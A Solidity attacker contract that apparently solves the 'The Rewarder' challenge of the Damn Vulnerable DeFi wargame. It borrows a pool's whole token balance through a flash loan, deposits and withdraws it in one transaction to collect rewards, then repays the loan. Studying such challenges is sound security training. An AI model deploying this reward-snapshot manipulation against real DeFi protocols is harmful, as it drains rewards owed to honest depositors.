// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title FlashLoanerPool - Attacker
 * @author Valentin Staykov - https://github.com/Bludya/damn-vulnerable-def-solutions
 */

 contract TheRewarderAttacker {
    DamnValuableToken token;
    RewardToken rewardToken;
    FlashLoanerPool lender;
    TheRewarderPool rewarder;

    constructor(
        DamnValuableToken _token,
        RewardToken _rewardToken,
        FlashLoanerPool _lender,
        TheRewarderPool _rewarder
        
    ) {
        token = _token;
        rewardToken = _rewardToken;
        lender = _lender;
        rewarder = _rewarder;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(lender));

        lender.flashLoan(amount);

        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        token.transfer(address(lender), amount);
    }
 }